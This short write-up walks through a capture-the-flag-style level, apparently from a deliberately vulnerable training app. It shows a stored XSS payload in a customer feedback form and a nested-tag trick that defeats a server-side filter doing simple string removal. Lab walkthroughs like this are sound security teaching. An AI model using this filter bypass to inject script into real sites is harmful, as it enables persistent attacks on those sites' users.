# Level 4

## Server-side XSS Protection (XSS)
_Perform a persisted XSS attack with <iframe src="javascript:alert(`xss`)"> bypassing a server-side security mechanism._

I tried to use this payload in the _Customer Feedback_ form, but the payload was deleted:
```
Hello <iframe src="javascript:alert(`xss`)"> --> Hello (anonymous)
```

Hopefully, it's just a simple string replacement. So let's try:
```
<<iframe src="javascript:alert(`xss`)">iframe src="javascript:alert(`xss`)">
```

Bingo, the nested `<iframe src="javascript:alert(`xss`)">` string is deleted resulting into the original payload!
